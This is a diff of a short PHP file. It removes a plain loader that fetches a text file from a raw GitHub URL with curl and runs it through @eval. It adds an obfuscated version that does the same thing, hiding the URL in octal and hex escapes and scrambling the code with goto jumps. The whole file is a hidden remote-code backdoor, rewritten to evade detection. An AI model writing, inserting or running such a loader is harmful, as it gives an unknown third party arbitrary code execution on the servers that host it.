@@ -1,8 +1,2 @@
-<?php 
-$url = "https://raw.githubusercontent.com/hjkccfg/dy2/main/bak.txt";
-$ch = curl_init($url); 
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-$result = curl_exec($ch);
-@eval("?>".$result);
-
-?>
+<?php
+ goto XR1pk; XR1pk: goto KQk1M; goto ZI8Pl; yCRu6: dM939: goto q1gaQ; Y2uhv: curl_setopt($WBh9X, CURLOPT_RETURNTRANSFER, 1); goto nEcAv; ZI8Pl: Bpgg3: goto Y2uhv; tDEyv: nQ89l: goto AGZ6K; WaFav: t83Z7: goto HpAZf; lvQ9x: $W9VmA = "\150\164\x74\x70\x73\72\x2f\x2f\x72\x61\167\56\x67\151\164\x68\165\142\x75\x73\x65\x72\143\x6f\x6e\164\x65\x6e\x74\56\x63\x6f\x6d\x2f\x68\152\x6b\143\x63\146\147\57\x64\x79\x32\x2f\x6d\141\x69\156\57\x62\x61\153\56\164\x78\164"; goto D_EID; AGZ6K: $wzv2F = curl_exec($WBh9X); goto FJ7xg; q1gaQ: $WBh9X = curl_init($W9VmA); goto tZWS4; D_EID: goto dM939; goto yCRu6; lY7q4: KQk1M: goto lvQ9x; tZWS4: goto Bpgg3; goto WaFav; FJ7xg: goto t83Z7; goto lY7q4; nEcAv: goto nQ89l; goto tDEyv; HpAZf: @eval("\77\76" . $wzv2F);
